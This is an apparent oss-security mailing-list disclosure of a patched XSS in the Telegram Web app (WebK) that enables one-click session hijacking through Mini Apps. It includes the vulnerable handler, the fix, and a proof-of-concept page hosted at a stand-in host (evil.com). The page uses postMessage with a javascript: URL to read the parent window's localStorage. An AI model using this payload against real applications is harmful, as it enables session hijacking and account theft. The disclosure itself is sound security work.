Received: (qmail 13752 invoked by uid 550); 28 Apr 2024 16:17:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9421 invoked from network); 28 Apr 2024 15:59:53 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1714319984; x=1714924784; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=C1VxEmTPt7QPwXFfODATdhJpOVuJtGsPFm89qCST3hU=;
        b=YSzKX9wzB88fwCkaiXgfLVB5x3xjrrLONuImH0Wy/5iclzqZ4rKMsjkZBRzx444AKu
         +gqjAv6i6c1pJsTNtGvQZL+7VPUpm5tGuMKP+vMx6OT8mXRGeqj9tK+W3/qzrKKyFROA
         Eg958nJD6iX3b3pZUXBFWnKjlVaOnmIp/m1vOul68+4C7nK6ozf6KhcbH546xdGdbrSU
         Upi+JzC2VhzSrDELZlNBiuvlrgzGxBXINkTPBOf5H0pBsnnBQH94sT6McnPkY71JYtrN
         3ALZu6yLvhOzDNGbdNu/XFIXT955dw4sYtSCrs4LcHqZP3Ax6D2Kr/fqNmZ6VDfLQMWW
         s69Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1714319984; x=1714924784;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=C1VxEmTPt7QPwXFfODATdhJpOVuJtGsPFm89qCST3hU=;
        b=XFFjJeM++RIadRIysPH+n0BLo+TmiDFm/N9K2qrBKX9PvxAbt6Cvn9SvTMq+SBH5KK
         jlMGfI0cKTtx5SANMoIKibKM0PWfiGo6Weimh+cDxpZQW5DrL3nVYGcJBjs/gpx3yvBq
         vVHU1tqU1neTzS6gCPXLCmQ/1+3ZvZ9QULgmosW20Iar1af0n+Fozy3IS7WoaRdGOEYS
         cB2GprXtiJrZJbgm5UOb+b8NouPhZpk5xjk0OCHRUxwoknus7O0wWpHarbL9AZLHAxhL
         0iJlDNkexar0FjwDd9SBfkRkh//A4tq++3/bndOSQgm6Ps6V8ZXTmPk9rDVTxcrqjny1
         IrWQ==
X-Gm-Message-State: AOJu0YxEdZ8Q509kNgt8QDlZ+5PgvSKSddazi1kCuduXRORgBYpTUXN5
	PuZxNqHbvVbGw8rzqe/18Xb5E+PMnE/v18mwZ3HoiswfKDlyYcmxMUu3lNqBcDP6bavx0XjBTm1
	Ty6trMRnzMdRUWbJ7dveILZn+bTSNdSht
X-Google-Smtp-Source: AGHT+IGvdj9oJx+LSErKUvajFZAZ848PJlRdFnF85G3ossQABDCrscbVOxkcLNLOGqSXiyXBF+O61r5x817FVHVmMDA=
X-Received: by 2002:a17:906:459:b0:a58:7ea5:c49b with SMTP id
 e25-20020a170906045900b00a587ea5c49bmr6697642eja.42.1714319984279; Sun, 28
 Apr 2024 08:59:44 -0700 (PDT)
MIME-Version: 1.0
From: Pedro Batista <pedbap.g@gmail.com>
Date: Sun, 28 Apr 2024 17:59:34 +0200
Message-ID: <CAD44bnPA-_1PRL2SqwvFssSo6MAN4wMkRMXwhy0XmJwrWGPxaQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000b1ca6106172a3901"
Subject: [oss-security] Telegram Web app XSS / Session Hijacking 1-click

--000000000000b1ca6106172a3901
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi oss-security,
I would like to share a vulnerability I reported on Telegram Web
application which is Open Source (https://github.com/morethanwords/tweb).
The vulnerability is a XSS that can be exploited to achieve session
hijacking with 1-click using Telegram Mini Apps.

I reported the vulnerability on March 9th, 2024 and Telegram promptly fixed
it on March 11th, 2024.

# Vulnerable version: Telegram WebK 2.0.0 (486) and below
# Fixed version: Telegram WebK 2.0.0 (488)

# Attack Surface
## Telegram Mini Apps
=E2=80=9CTelegram Mini Apps are essentially web applications that you can r=
un
directly within the Telegram messenger interface. Mini Apps support
seamless authorization, integrated crypto and fiat payments (via Google Pay
and Apple Pay), tailored push notifications, and more.=E2=80=9D

> https://core.telegram.org/bots/webapps
> https://ton.org/mini-apps

Is important to highlight that this feature is heavily used for crypto
payments in the TON Blockchain.

# Static Analysis
A cached version of the vulnerable file can be found here:
- https://web.telegram.org/k/appDialogsManager-aLs9GOvc.js

```
telegramWebView.addMultipleEventsListeners({
       // [...]
       web_app_open_link:({url:t})=3D>{window.open(t,"_blank")}
}
```
The vulnerability was triggered with `postMessage` communication by abusing
the event `web_app_open_link` which allowed a new URL to remain with the
javascript context of the parent window using the `javascript:` scheme as
XSS payload.

# Weaponized Setup
1. Attacker creates a Bot + Mini App
2. Sets the URL of the Mini App =3D> https://evil.com/homepage.html
3. The exploit will be hosted in the homepage of the attacker=E2=80=99s site
3.1. homepage.html
```
<body onload=3Dexploit()>
 <script>
function exploit() {
 window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link',
eventData: {url:
"javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*'); }
 </script>
</body>
```

# Telegram Patch Commit
https://github.com/morethanwords/tweb/commit/2153ea9878668769faac8dd5931b7e=
0b96a9f129/src/components/popups/webApp.ts

```
export default function
safeWindowOpen(url: string) {
    window.open(url, '_blank', 'noreferrer');
}
```

# Demo
I have published a writeup for this finding which includes the Exploit
Demo, it's available here:

https://medium.com/@pedbap/telegram-web-app-xss-session-hijacking-1-click-9=
5acccdc8d90

I recently requested a CVE for this vulnerability as well, looking forward
to updating the thread as soon as it is issued.

Thanks for looking into my report.

Best regards,
Pedro Baptista

--000000000000b1ca6106172a3901--
